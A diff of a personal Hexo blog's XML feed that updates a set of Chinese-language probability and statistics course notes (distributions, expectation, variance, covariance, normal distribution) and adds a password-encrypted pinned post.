-<p>若$P(AB)=P(A)P(B)$，则$A,B$独立，同时$A,\overline{B}$、$\overline{A},\overline{B}$、$\overline{A},B$也独立。</p>
-<p>二项分布概率：$P(k)=\mathrm{C}_{n}^{k}p^k(1-p)^{n-k}$</p>
-<blockquote>
-<p>多项分布：某随机实验如果有$k$种可能的结果$C_1 \sim C_k$，它们出现的概率是$p_1 \sim p_k$。在N随机试验的结果中，分别将$C_1 \sim C_k$的出现次数记为随机变量$x_1 \sim x_k$，那么$C_1$出现$x_1$次、$C_2$出现$x_2$次……$C_k$出现$x_k$次这种事件发生的概率是</p>
-<script type="math/tex; mode=display">\frac{N!}{x_1!x_2! ... x_k!}p_1^{x_1}p_2^{x_2} ... p_k^{x_k}，其中\sum_{i=1}^k x_i=N, \sum_{i=1}^k p_i=1</script></blockquote>
-<h2 id="随机变量及其分布"><a href="#随机变量及其分布" class="headerlink" title="随机变量及其分布"></a>随机变量及其分布</h2><p>随机变量$X(\omega)$是一个函数，其中$\omega$是样本空间，$X$是样本空间到实数的映射。</p>
-<p>分布函数$F(x)=P(X \leq x)$，其定义域为$\mathbb{R}$，非严格单增（左极限为0，右极限为1），右连续。</p>
-<p>概率密度函数 $f(x)$ 满足 <script type="math/tex">F(x) = \int_{-\infty}^x f(t) \mathrm{d}t , x \in \mathbb{R}</script>，当$f(x)$连续时，可简化为$F’(x) = f(x)$。有<script type="math/tex">f(x)\ge0</script>且<script type="math/tex">\int_{-\infty}^\infty f(x)\mathrm{d}x = 1</script>.</p>
-<p>求概率的问题可以转化为概率密度函数的积分：$P(X \in G)=\int_Gf(x)\mathrm{d}x$.</p>
-<h3 id="非连续分布"><a href="#非连续分布" class="headerlink" title="非连续分布"></a>非连续分布</h3><p>几何分布与超几何分布略去.</p>
-<p>二项分布:$X \sim B(n,p)$,$P{X=k}=C_{n}^{k}p^k(1-p)^{n-k}$</p>
-<blockquote>
-<p>二项分布的图像是单峰的,由于</p>
-<p>$\frac{P{X=k}}{P{X=k-1}}=1+\frac{(n+1)p-k}{kq}$,故$k$最靠近$(n+1)p$时易得最值.</p>
-</blockquote>
-<p>泊松分布:$X \sim P(\lambda)$,$P{X=\lambda}=\frac{\lambda^k}{k!}e^{-\lambda}$</p>
-<blockquote>
-<p>泊松分布相当于对$e^x$的泰勒展开各项之和归一化.</p>
-<p>泊松定理:二项分布以泊松分布为极限分布.具体而言, 对于$X \sim B(n,p)$,当n足够大时(&gt;=100),我们可以近似把它看作$X \sim P(\lambda)$,其中$\lambda=np$</p>
-</blockquote>
-<h3 id="连续分布"><a href="#连续分布" class="headerlink" title="连续分布"></a>连续分布</h3><p>均匀分布(uniform distribution)  <script type="math/tex">f(x)=\left\{
-\begin{array}{}
-\frac{1}{b-a}       &      & {x \in [a,b]}\\
-0     &      & {others}
-\end{array} \right.</script>, <script type="math/tex">x \sim U(a,b)</script></p>
-<p>指数分布(exponential)  <script type="math/tex">f(x)=\left\{
-\begin{array}{}
-\lambda e^{-\lambda x}       &      & {x > 0}\\
-0     &      & {others}
-\end{array} \right. , x \sim e(\lambda)</script></p>
-<p>伽马分布(gamma distribution) <script type="math/tex">f(x)=\left\{
-\begin{array}{}
-\frac{\beta^\alpha}{\Gamma(\alpha)}x^{\alpha-1}\mathrm{e}^{-\beta x}       &      & {x > 0}\\
-0     &      & {others}
-\end{array} \right. , x \sim \Gamma(\alpha, \beta)</script>.</p>
-<blockquote>
-<script type="math/tex; mode=display">\Gamma(x) = \int_0^{\infty}t^{x-1}\mathrm{e}^{-t}\mathrm{d}t</script></blockquote>
-<h3 id="随机变量函数的分布Y-f-X-型题目的做法"><a href="#随机变量函数的分布Y-f-X-型题目的做法" class="headerlink" title="随机变量函数的分布Y=f(X)型题目的做法"></a>随机变量函数的分布Y=f(X)型题目的做法</h3><p>以求密度函数$f(x)$为例:</p>
-<ul>
-<li>求出$Y$对应的值域</li>
-<li>将$X$用$Y$解出,把$F(X)$替换成$F(Y)$</li>
-<li>对$F(Y)$求导得到$f(y)$</li>
-</ul>
-<p>对于某些需要分类讨论的题目:</p>
-<ul>
-<li>求出$Y$对应的值域,并找到分段点</li>
-<li>在该区间内解不等式,解得$X \in g(Y)$,解$F(Y)=\int_{x \in g(Y)}f(x)\mathrm{d}x$</li>
-<li>对$F(Y)$求导得到$f(y)$,汇总结果</li>
-</ul>
-<p>注意求积分$+C$时需要注意一下分布函数的连续性.</p>
-<h2 id="多（二）维随机变量及其分布"><a href="#多（二）维随机变量及其分布" class="headerlink" title="多（二）维随机变量及其分布"></a>多（二）维随机变量及其分布</h2><h3 id="二维离散型随机变量分布"><a href="#二维离散型随机变量分布" class="headerlink" title="二维离散型随机变量分布"></a>二维离散型随机变量分布</h3><p>就是一个所有项和为1的表，没啥说的，求概率就是把对应位置的概率加起来就行。</p>
-<p>边缘分布：</p>
-<ul>
-<li><script type="math/tex; mode=display">p_{i\bullet}=\sum_j p_{ij}</script></li>
-<li><script type="math/tex; mode=display">p_{\bullet j}=\sum_i p_{ij}</script></li>
-</ul>
-<p>条件分布律：</p>
-<ul>
-<li><script type="math/tex; mode=display">P(Y=y_j|X=x_i)=\frac{p_{ij}}{p_{i \bullet}}</script></li>
-<li><script type="math/tex; mode=display">P(X=x_i|Y=y_j)=\frac{p_{ij}}{p_{\bullet j}}</script></li>
-</ul>
-<h3 id="二维连续型随机变量分布"><a href="#二维连续型随机变量分布" class="headerlink" title="二维连续型随机变量分布"></a>二维连续型随机变量分布</h3><p>相当于求二重积分，需要注意积分的定义域。</p>
-<p>通常会利用定义域内积分和为1的性质求参数，然后重新求指定区域的二重积分来求概率。</p>
-<p>二维分布函数与密度函数：<script type="math/tex">F(x,y)=P(X\le x, Y\le y)=\int_{-\infty}^{x} \int_{-\infty}^{y} f(u,v)\mathrm{d}u\mathrm{d}v</script></p>
-<p>二维前缀和：<script type="math/tex">P(x_1<X\le x_2, y_1<Y\le y_2) = F(x_2,y_2)-F(x_1,y_2)-F(x_2,y_1)+F(x_1,y_1)</script></p>
-<p>均匀分布  <script type="math/tex">f(x,y)=\left\{
-\begin{array}{}
-\frac{1}{m(G)}       &      & {(x,y) \in G}\\
-0     &      & {others}
-\end{array} \right.</script></p>
-<p>边缘密度：</p>
-<ul>
-<li><script type="math/tex; mode=display">f_X(x)=f(x,+\infty)=\int_{-\infty}^\infty f(x,y)\mathrm{d}y</script></li>
-<li><script type="math/tex; mode=display">f_Y(y)=f(+\infty,y)=\int_{-\infty}^\infty f(x,y)\mathrm{d}x</script></li>
-</ul>
-<p>条件分布函数：</p>
-<ul>
-<li><p><script type="math/tex">F_{X|Y}(x|y)=\int_{-\infty}^x \frac{f(u,y)}{f_Y(y)}\mathrm{d}u</script>（另一半懒得写了）</p>
-</li>
-<li><script type="math/tex; mode=display">f_{X|Y}(x|y)= \frac{f(x,y)}{f_Y(y)}, f_{Y|X}(y|x)= \frac{f(x,y)}{f_X(x)}</script></li>
-</ul>
-<blockquote>
-<p>常见题型：</p>
-<p>一个密度、两个条件、两个边缘</p>
-<ul>
-<li>已知一个密度，求剩下四个。</li>
-<li>已知一个条件与对应的边缘，求剩下三个。</li>
-</ul>
-<p>已知二维密度函数$f(x,y)$，$Z=g(X,Y)$，求$Z$的密度函数$f_Z(z)$</p>
-<ul>
-<li>确定$f(x,y)$的有效区间$R$</li>
-<li>计算$F<em>Z(z)=\iint</em>{(x,y)\in R}f(x,y)\mathrm{d}x\mathrm{d}y$，注意分类讨论</li>
-<li>对$z$求导得到密度函数$f_Z(z)$</li>
-</ul>
-<p><del>卷积再见</del></p>
-<p>若$Z=\max{X,Y}$且$X,Y$独立，则$F<em>Z(z)=F</em>{X}(z)F_{Y}(z)$</p>
-<p>若$Z=\min{X,Y}$且$X,Y$独立，则$F<em>Z(z)=1-(1-F</em>{X}(z))(1-F_{Y}(z))$</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
   </entry>
   <entry>
     <title>如何正确的抢拼手气红包</title>
@@ -2820,6 +2748,221 @@
       </tags>
   </entry>
   <entry>
+    <title>（不定期更新）概统笔记</title>
+    <url>/2022/09/26/%E6%A6%82%E7%BB%9F.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>顺便用作$\LaTeX$练习.</p>
+<span id="more"></span>
+<h1 id="成绩分布"><a href="#成绩分布" class="headerlink" title="成绩分布"></a>成绩分布</h1><p>卷面成绩：50%</p>
+<p>平时成绩：50%</p>
+<ul>
+<li>平时作业</li>
+<li>期中+小测</li>
+<li>非标</li>
+<li>随堂表现</li>
+</ul>
+<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><p>理解性、记忆性</p>
+<p>微积分功底</p>
+<p>题型固定</p>
+<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="概率论基础"><a href="#概率论基础" class="headerlink" title="概率论基础"></a>概率论基础</h2><p>用$A,B,C$等表示事件</p>
+<p>$\overline{A}$表示A的对立事件（对立是互斥的充分条件）</p>
+<p>$AB=A\cap B$</p>
+<p>$A-B=A\overline{B}=A-AB$</p>
+<p>$\overline{A\cap B}=\overline{A}\cup\overline{B}$</p>
+<p>$\overline{A\cup B}=\overline{A}\cap\overline{B}$</p>
+<p>发生B后再发生A的概率$P(A|B)=\frac{P(AB)}{P(B)}$，其中$P(B)&gt;0$</p>
+<p>全概率公式：设<script type="math/tex">B_1, ... ,B_m</script>为完备事件组，则<script type="math/tex">P(A)=\sum_{i=1}^m{P(A|B_i)P(B_i)}</script></p>
+<p>贝叶斯公式：设<script type="math/tex">B_1,B_2 ... B_m</script>为完备事件组，则<script type="math/tex">P(B_i|A)=\frac{P(B_iA)}{P(A)}=\frac{P(B_i)P(A|B_i)}{\sum_{i=1}^m{P(A|B_i)P(B_i)}}</script>，即贝叶斯公式是乘法公式与全概率公式的组合。</p>
+<p>若$P(AB)=P(A)P(B)$，则$A,B$独立，同时$A,\overline{B}$、$\overline{A},\overline{B}$、$\overline{A},B$也独立。</p>
+<p>二项分布概率：$P(k)=\mathrm{C}_{n}^{k}p^k(1-p)^{n-k}$</p>
+<blockquote>
+<p>多项分布：某随机实验如果有$k$种可能的结果$C_1 \sim C_k$，它们出现的概率是$p_1 \sim p_k$。在N随机试验的结果中，分别将$C_1 \sim C_k$的出现次数记为随机变量$x_1 \sim x_k$，那么$C_1$出现$x_1$次、$C_2$出现$x_2$次……$C_k$出现$x_k$次这种事件发生的概率是</p>
+<script type="math/tex; mode=display">\frac{N!}{x_1!x_2! ... x_k!}p_1^{x_1}p_2^{x_2} ... p_k^{x_k}，其中\sum_{i=1}^k x_i=N, \sum_{i=1}^k p_i=1</script></blockquote>
+<h2 id="随机变量及其分布"><a href="#随机变量及其分布" class="headerlink" title="随机变量及其分布"></a>随机变量及其分布</h2><p>随机变量$X(\omega)$是一个函数，其中$\omega$是样本空间，$X$是样本空间到实数的映射。</p>
+<p>分布函数$F(x)=P(X \leq x)$，其定义域为$\mathbb{R}$，非严格单增（左极限为0，右极限为1），右连续。</p>
+<p>概率密度函数 $f(x)$ 满足 <script type="math/tex">F(x) = \int_{-\infty}^x f(t) \mathrm{d}t , x \in \mathbb{R}</script>，当$f(x)$连续时，可简化为$F’(x) = f(x)$。有<script type="math/tex">f(x)\ge0</script>且<script type="math/tex">\int_{-\infty}^\infty f(x)\mathrm{d}x = 1</script>.</p>
+<p>求概率的问题可以转化为概率密度函数的积分：$P(X \in G)=\int_Gf(x)\mathrm{d}x$.</p>
+<h3 id="非连续分布"><a href="#非连续分布" class="headerlink" title="非连续分布"></a>非连续分布</h3><p>几何分布与超几何分布略去.</p>
+<p>二项分布:$X \sim \mathrm{B}(n,p)$,$P{X=k}=\mathrm{C}_{n}^{k}p^k(1-p)^{n-k}$</p>
+<blockquote>
+<p>二项分布的图像是单峰的,由于</p>
+<p>$\frac{P{X=k}}{P{X=k-1}}=1+\frac{(n+1)p-k}{kq}$,故$k$最靠近$(n+1)p$时易得最值.</p>
+</blockquote>
+<p>泊松分布:$X \sim \mathrm{P}(\lambda)$,$P{X=k}=\frac{\lambda^k}{k!}e^{-\lambda}$</p>
+<blockquote>
+<p>泊松分布相当于对$e^x$的泰勒展开各项之和归一化.</p>
+<p>泊松定理:二项分布以泊松分布为极限分布.具体而言, 对于$X \sim \mathrm{B}(n,p)$,当n足够大时(&gt;=100),我们可以近似把它看作$X \sim \mathrm{P} (\lambda)$,其中$\lambda=np$</p>
+</blockquote>
+<h3 id="连续分布"><a href="#连续分布" class="headerlink" title="连续分布"></a>连续分布</h3><p>均匀分布(uniform distribution)  <script type="math/tex">f(x)=\left\{
+\begin{array}{}
+\frac{1}{b-a}       &      & {x \in [a,b]}\\
+0     &      & {others}
+\end{array} \right.</script>, <script type="math/tex">x \sim U(a,b)</script></p>
+<p>指数分布(exponential)  <script type="math/tex">f(x)=\left\{
+\begin{array}{}
+\lambda e^{-\lambda x}       &      & {x > 0}\\
+0     &      & {others}
+\end{array} \right. , x \sim e(\lambda)</script></p>
+<p>伽马分布(gamma distribution) <script type="math/tex">f(x)=\left\{
+\begin{array}{}
+\frac{\beta^\alpha}{\Gamma(\alpha)}x^{\alpha-1}\mathrm{e}^{-\beta x}       &      & {x > 0}\\
+0     &      & {others}
+\end{array} \right. , x \sim \Gamma(\alpha, \beta)</script>.</p>
+<blockquote>
+<script type="math/tex; mode=display">\Gamma(x) = \int_0^{\infty}t^{x-1}\mathrm{e}^{-t}\mathrm{d}t</script></blockquote>
+<h3 id="随机变量函数的分布Y-f-X-型题目的做法"><a href="#随机变量函数的分布Y-f-X-型题目的做法" class="headerlink" title="随机变量函数的分布Y=f(X)型题目的做法"></a>随机变量函数的分布Y=f(X)型题目的做法</h3><p>以求密度函数$f(x)$为例:</p>
+<ul>
+<li>求出$Y$对应的值域</li>
+<li>将$X$用$Y$解出,把$F(X)$替换成$F(Y)$</li>
+<li>对$F(Y)$求导得到$f(y)$</li>
+</ul>
+<p>对于某些需要分类讨论的题目:</p>
+<ul>
+<li>求出$Y$对应的值域,并找到分段点</li>
+<li>在该区间内解不等式,解得$X \in g(Y)$,解$F(Y)=\int_{x \in g(Y)}f(x)\mathrm{d}x$</li>
+<li>对$F(Y)$求导得到$f(y)$,汇总结果</li>
+</ul>
+<p>注意求积分$+C$时需要注意一下分布函数的连续性.</p>
+<h2 id="多（二）维随机变量及其分布"><a href="#多（二）维随机变量及其分布" class="headerlink" title="多（二）维随机变量及其分布"></a>多（二）维随机变量及其分布</h2><h3 id="二维离散型随机变量分布"><a href="#二维离散型随机变量分布" class="headerlink" title="二维离散型随机变量分布"></a>二维离散型随机变量分布</h3><p>就是一个所有项和为1的表，没啥说的，求概率就是把对应位置的概率加起来就行。</p>
+<p>边缘分布：</p>
+<ul>
+<li><script type="math/tex; mode=display">p_{i\bullet}=\sum_j p_{ij}</script></li>
+<li><script type="math/tex; mode=display">p_{\bullet j}=\sum_i p_{ij}</script></li>
+</ul>
+<p>条件分布律：</p>
+<ul>
+<li><script type="math/tex; mode=display">P(Y=y_j|X=x_i)=\frac{p_{ij}}{p_{i \bullet}}</script></li>
+<li><script type="math/tex; mode=display">P(X=x_i|Y=y_j)=\frac{p_{ij}}{p_{\bullet j}}</script></li>
+</ul>
+<h3 id="二维连续型随机变量分布"><a href="#二维连续型随机变量分布" class="headerlink" title="二维连续型随机变量分布"></a>二维连续型随机变量分布</h3><p>相当于求二重积分，需要注意积分的定义域。</p>
+<p>通常会利用定义域内积分和为1的性质求参数，然后重新求指定区域的二重积分来求概率。</p>
+<p>二维分布函数与密度函数：<script type="math/tex">F(x,y)=P(X\le x, Y\le y)=\int_{-\infty}^{x} \int_{-\infty}^{y} f(u,v)\mathrm{d}u\mathrm{d}v</script></p>
+<script type="math/tex; mode=display">P(x_1<X\le x_2, y_1<Y\le y_2) = F(x_2,y_2)-F(x_1,y_2)-F(x_2,y_1)+F(x_1,y_1)</script><p>均匀分布  <script type="math/tex">f(x,y)=\left\{
+\begin{array}{}
+\frac{1}{m(G)}       &      & {(x,y) \in G}\\
+0     &      & {others}
+\end{array} \right.</script></p>
+<p>边缘密度：</p>
+<ul>
+<li><script type="math/tex; mode=display">f_X(x)=f(x,+\infty)=\int_{-\infty}^\infty f(x,y)\mathrm{d}y</script></li>
+<li><script type="math/tex; mode=display">f_Y(y)=f(+\infty,y)=\int_{-\infty}^\infty f(x,y)\mathrm{d}x</script></li>
+</ul>
+<p>条件分布函数：</p>
+<ul>
+<li><p><script type="math/tex">F_{X|Y}(x|y)=\int_{-\infty}^x \frac{f(u,y)}{f_Y(y)}\mathrm{d}u</script>（另一半懒得写了）</p>
+</li>
+<li><script type="math/tex; mode=display">f_{X|Y}(x|y)= \frac{f(x,y)}{f_Y(y)}, f_{Y|X}(y|x)= \frac{f(x,y)}{f_X(x)}</script></li>
+</ul>
+<blockquote>
+<p>常见题型：</p>
+<p>一个密度、两个条件、两个边缘</p>
+<ul>
+<li>已知一个密度，求剩下四个。</li>
+<li>已知一个条件与对应的边缘，求剩下三个。</li>
+</ul>
+<p>已知二维密度函数$f(x,y)$，$Z=g(X,Y)$，求$Z$的密度函数$f_Z(z)$</p>
+<ul>
+<li>确定$f(x,y)$的有效区间$R$</li>
+<li>计算<script type="math/tex">F_Z(z)=\iint_{(x,y)\in R}f(x,y)\mathrm{d}x\mathrm{d}y</script>，注意分类讨论</li>
+<li>对$z$求导得到密度函数$f_Z(z)$</li>
+</ul>
+<p><del>卷积再见</del></p>
+<p>若$Z=\max\{X,Y\}$且$X,Y$独立，则<script type="math/tex">F_Z(z)=F_{X}(z)F_{Y}(z)</script></p>
+<p>若$Z=\min\{X,Y\}$且$X,Y$独立，则<script type="math/tex">F_Z(z)=1-(1-F_{X}(z))(1-F_{Y}(z))</script></p>
+</blockquote>
+<h2 id="数学期望"><a href="#数学期望" class="headerlink" title="数学期望"></a>数学期望</h2><h3 id="数学期望的定义"><a href="#数学期望的定义" class="headerlink" title="数学期望的定义"></a>数学期望的定义</h3><p>离散变量的期望：$E(X)=\Sigma_{k=1}^\infty x_k P_k$</p>
+<p>连续变量的期望：$E(X)=\int_{-\infty}^\infty xf(x)\mathrm{d}x$</p>
+<p>当级数的和（或积分）绝对收敛时，数学期望存在。</p>
+<blockquote>
+<p>对于二维的情况，还可以这样算:</p>
+<p>$E(X)=\int_{-\infty}^\infty xf_X(x)\mathrm{d}x$</p>
+<p>$E(Y)=\int_{-\infty}^\infty yf_Y(y)\mathrm{d}y$</p>
+</blockquote>
+<h3 id="随机变量函数的期望"><a href="#随机变量函数的期望" class="headerlink" title="随机变量函数的期望"></a>随机变量函数的期望</h3><script type="math/tex; mode=display">E(g(x))=\Sigma_{k=1}^\infty g(x_k)P_k=\int_{-\infty}^{\infty}g(x)f(x)\mathrm{d}x</script><script type="math/tex; mode=display">E(g(x,y))=\Sigma\Sigma g(x_i,y_j)P_{ij}=\int_{-\infty}^{\infty} \int_{-\infty}^{\infty} g(x,y)f(x,y)\mathrm{d}x\mathrm{d}y</script><h3 id="数学期望的性质"><a href="#数学期望的性质" class="headerlink" title="数学期望的性质"></a>数学期望的性质</h3><script type="math/tex; mode=display">E(C)=C</script><script type="math/tex; mode=display">E(C_1X+C_2Y)=C_1E(X)+C_2E(Y)</script><p>若$X$与$Y$独立，则<script type="math/tex">E(XY)=E(X)E(Y)</script></p>
+<h3 id="常见分布的期望"><a href="#常见分布的期望" class="headerlink" title="常见分布的期望"></a>常见分布的期望</h3><p><img src="/2022/09/26/%E6%A6%82%E7%BB%9F/20190405121236967.png"></p>
+<h2 id="方差"><a href="#方差" class="headerlink" title="方差"></a>方差</h2><h3 id="方差的定义"><a href="#方差的定义" class="headerlink" title="方差的定义"></a>方差的定义</h3><p>$D(X)=E(X-E(X))^2=E(X^2)-E(X)^2$</p>
+<blockquote>
+<p>设$E(X)=c$，</p>
+<p>$=E(X-c)^2=E(X^2-2cX+c^2)$</p>
+<p>$=E(X^2)-2cE(x)+c^2$</p>
+<p>$=E(X^2)-c^2=E(X^2)-E(X)^2$</p>
+</blockquote>
+<p>标准差为$\sqrt{D(X)}$</p>
+<h3 id="方差的性质"><a href="#方差的性质" class="headerlink" title="方差的性质"></a>方差的性质</h3><p>$D(C)=0$</p>
+<p>$D(aX)=a^2D(X)$</p>
+<p>当$X,Y$独立时，$D(X \pm Y)=D(X)+D(Y)$</p>
+<p>当$X,Y$独立时，<script type="math/tex">D(\Sigma_{i=1}^n c_iX_i)=\Sigma_{i=1}^nc_i^2D(X_i)</script></p>
+<p>$D(X)=0 \iff \exists c, P(X=c)=1$，但这不意味着$X=c$（同：概率为1的事件不一定是必然事件）</p>
+<blockquote>
+<p>常用随机变量函数的方差：</p>
+</blockquote>
+<p>变异系数：$C_v=\frac{\sqrt{D(X)}}{|E(X)|}$</p>
+<h3 id="原点矩与中心矩"><a href="#原点矩与中心矩" class="headerlink" title="原点矩与中心矩"></a>原点矩与中心矩</h3><p>$m_k=E(X^k)$</p>
+<p>$\mu_k=E(X-E(X))^k$</p>
+<p>因此方差是二阶中心矩。</p>
+<h2 id="协方差与相关系数"><a href="#协方差与相关系数" class="headerlink" title="协方差与相关系数"></a>协方差与相关系数</h2><h3 id="协方差的定义"><a href="#协方差的定义" class="headerlink" title="协方差的定义"></a>协方差的定义</h3><p>$\mathrm{Cov}(X,Y)=E((X-EX)(Y-EY))=E(XY)-E(X)E(Y)$</p>
+<blockquote>
+<p>证明与方差类似，此略</p>
+</blockquote>
+<h3 id="协方差的性质"><a href="#协方差的性质" class="headerlink" title="协方差的性质"></a>协方差的性质</h3><p>$\mathrm{Cov}(X,X)=D(X)$</p>
+<p>$\mathrm{Cov}(X,Y)=\mathrm{Cov}(Y,X)$</p>
+<p>$\mathrm{Cov}(X,a)=0$</p>
+<p>$\mathrm{Cov}(aX,bY)=ab\mathrm{Cov}(X,Y)$</p>
+<p>$\mathrm{Cov}(X+Y,Z)=\mathrm{Cov}(X,Z)+\mathrm{Cov}(Y,Z)$</p>
+<p>$D(X\pm Y)=D(X)+D(Y)\pm 2\mathrm{Cov}(X,Y)$</p>
+<p>若$X$与$Y$独立，则$\mathrm{Cov}(X,Y)=0$</p>
+<blockquote>
+<p>证明：显然由期望的性质可得。</p>
+<p>由此可证若$X$与$Y$独立，$D(X \pm Y)=D(X)+D(Y)$</p>
+</blockquote>
+<h3 id="随机变量的标准化"><a href="#随机变量的标准化" class="headerlink" title="随机变量的标准化"></a>随机变量的标准化</h3><p>$X^*=\frac{X-E(X)}{\sqrt{D(X)}}$</p>
+<p>其期望为0，方差为1，没有量纲。</p>
+<h3 id="相关系数的定义"><a href="#相关系数的定义" class="headerlink" title="相关系数的定义"></a>相关系数的定义</h3><p>相关系数<script type="math/tex">(X,Y)=\mathrm{Cov}(X^*,Y^*)=\frac{1}{\sqrt{D(X)}}\frac{1}{\sqrt{D(Y)}}\mathrm{Cov}(X,Y)</script></p>
+<p>显然$X,Y$不能为常数</p>
+<p>相关系数需要计算五个期望：$E(X),E(Y),E(X^2),E(Y^2),E(XY)$</p>
+<p>即<script type="math/tex">R(X,Y)=\frac{E(XY)-E(X)E(Y)}{\sqrt{E(X^2)-E(X)^2}\sqrt{E(Y^2)-E(Y)^2}}</script></p>
+<h3 id="相关系数的性质"><a href="#相关系数的性质" class="headerlink" title="相关系数的性质"></a>相关系数的性质</h3><p>$0\le |{R(X,Y)}| \le 1$</p>
+<p>当$R(X,Y)=1$时，$\exists t_0&gt;0, P(Y=t_0 X)=1$，即$X,Y$正相关。</p>
+<p>当$R(X,Y)=-1$时，$\exists t_0&lt;0, P(Y=t_0 X)=1$，即$X,Y$负相关。</p>
+<p>$R(X,Y)=0$表明$X,Y$不相关，是$X,Y$独立的必要条件。</p>
+<p>如果要证明$X,Y$不独立，应选取合适的区间，使$P(X,Y)\ne P(X)P(Y)$</p>
+<h2 id="正态分布"><a href="#正态分布" class="headerlink" title="正态分布"></a>正态分布</h2><h3 id="标准正态分布"><a href="#标准正态分布" class="headerlink" title="标准正态分布"></a>标准正态分布</h3><p>$\mathrm{N}(0,1)=\varphi(x)=\frac{1}{\sqrt{2\pi}}e^{-\frac{x^2}{2}},x \in \mathbb{R}$</p>
+<blockquote>
+<p>偶函数，钟形曲线。</p>
+</blockquote>
+<p>$\Phi(x)=\int_{-\infty}^x\varphi(x)\mathrm{d}x$</p>
+<blockquote>
+<p>$\Phi(0)=\frac{1}{2}$</p>
+<p>$\Phi(x)+\Phi(-x)=1$</p>
+</blockquote>
+<h3 id="正态分布-1"><a href="#正态分布-1" class="headerlink" title="正态分布"></a>正态分布</h3><p>若$\frac{X-\mu}{\sigma}\sim \mathrm{N}(0,1)$，则$X \sim \mathrm{N}(\mu, \sigma^2)$，故$F(x)=\Phi(\frac{x-\mu}{\sigma})$</p>
+<script type="math/tex; mode=display">\mathrm{N}(\mu, \sigma^2)=\frac{1}{\sigma\sqrt{2\pi}}e^{-\frac{(x-\mu)^2}{2\sigma^2}},x \in \mathbb{R}</script>]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>（置顶）碎碎念</title>
+    <url>/2038/01/19/%E7%A2%8E%E7%A2%8E%E5%BF%B5.html</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="4d569429e40884b6b1499ac4e7e93ff0391e45b21bdac07692bf36ab8f7fa3d8">6fcf1523ddce79b7eefea9a75525b5245de786104bf519d9988408b867bdf551bd0c68bfb36652de0234a851b59b631ffe9d78a9e0290bfff0952c565a4257c23f889a6206ebd9cee2e4e4b13fb740ec32d5f036c78c189b8c30cd311f0c44bcdf9ddedfd6c66bfdfc2bb4a0a23eb7a62d13e83184952540545ea7150454871ae24d80818cfeeb6aa2471f860b72b98c56bbbd4702503971a324dd6df6dd21507ec37799310b591df3f60c43021e13c24c306c1bd047d188eda2c534bb899685046131a268390326c442e9b92300fba7c5e795cd9656b2583900e08e83af6cdebba87ed3eb840c9a0930d0840b98b55775745e3a51ed3b8799fc0fb35ba9aaa30609febde5b587e16d318882d844c49395260b433fbcad4aa40ee1c13c8c92c12a0892c6c237eecd9219b0e7122d178d381fc417eb0a5589e3cdc7952dd32b28a41e36049c43e319e754e9980639dde30bfb93355680b1c2505a33f169d095d830a4d28c7532be7fca77c07874b91105ab49c4cd4d61a06d17a228640d0d7ffa099150fb87ddbac1de725b6bfebf796451f0fd7ac28cd7c44c9d347963e7201aad7534b0dbf27fc01897faf5768a6b64d80c84ac14486b4e7c5706b2af565de95f5ac16fe41c3600e0fa62941820f1bf5615f78821f2f805e77755c267d22e8839884b0352a118197c583aefe1ac5aea9d7b39ff0a1fa7bc45eca0a3488a838c8559f957de4e3acee2bbb760dc606acf3ea2baeeeab18dcafeeda776b48fce26861b6413a746aec1dcd2e9aa45a4b2131885ecb6342b8bcfd3e55b8458efd91bb46cebeb11b9fa8184977eb4e0e6e1b9f6aac03ef139cd0cf6da6900f414f76286c4dcf1c909d79b212c90b0721ad0846ac574cefba3b6b7ecf0ca48fc6ed75da87a32519e0b83f5cf44fa4c92b62e55a6d081c3e2a62962387f3096d1da53e0a68e002b7e8d510a8926a7ffc6e306b2cbaa49aadfd7d778a50238602caa7df4a9c31a6907c29b489053c8c51976c07886f64c61f8f15fa45a588dcf12ef998d402b7702f2b2afc60133d0faa42e3f301099ba94db72e5fcf08609464c40226671ff8b317500be2ad8c15af42d10816707ca05fbcf51f480697d3e629e5c8f87f86a9f7d640e3d9b546c71d69ae554c3d7d5cdcca206b839f33a5c5f01cf4feacf8d53830c2baa99fd62d3078eb7928a2f4f57a2c4e35095a181bf1c9c3fe2203ae11e79f6269ec44074171e5f9ce3bc60648582db3aaab5370380029f26fdaebb6f77a58c37dce80a73a03a7cd7b4c86ce0566b49c6a54dbdef467b64c3a8efd7e95e2b8c28408c70322fdac6f65182a2e6d6579201308690964cec516ab9c1714103a65e1ae83dab841158788fa07439e2477409e598f5081e9dedb5bd914d77fa5a5ed1e24100fe78f4a8f9fe036548a9394544668039dfbc1ca0e3194718907c66806a43b75198a465eff526439f742a40bc296f440d89fed0f037b27f32a074da98f10c0f683b12aeb0fcc669e1d63309c9059386d6653e65b4db65d604673803170d4464fcded8365a22791513c9659ab8bb0eaf218945b777492d13b5b5292b9bf767afda1bb53c1e7d3a38963c42e7ea958b4e265bd01db8db569dde6392df47d4b600408e21c732987b77758c4ee1a6c84ed570f061ee27cbb4edca30dada520ef7ee2a2b7942a769000d596405178a140ea237a5e6dd3b96e26846540e6f8028351f47e6c7b94f0afed976045c6724b2f72579490138f86207cfa9cfae445761ed93f43c902a843430bfdc2b2ce77f188eee2f00024efdbc3b7f913a2c5384e1c231834af501f3dc641fa5574b3609e3bb5b2de0174a08493b0eccd96d211f4917265146170d3beed8549926638cbfa27232e5c71fb39c8b4251c28baa1ca880cae7804ecb217c5c3579d684db2407f13f30da0c45c9f0463e5ab1c81d5ba3800805cfecae464504d8d62678ab29f5affceae179418cd9d2a78e35bd319064154c036b191449a18732c9f168773d488b3d0ed4097bed5ff33feecc2110ca4bac4105e5e53f6c80f5465bf3da7e79dee5f2a01e4a626fd5111507b640dd144243eab70a6f55b20b3e46579b393ae5e3d39d4be3a5f4f1dc8e024fa3ffd2084b2c2fc85ec39e001fdc67d4749fea3b46b45a158e97f6ba3ceb50bf11b024d617aaebf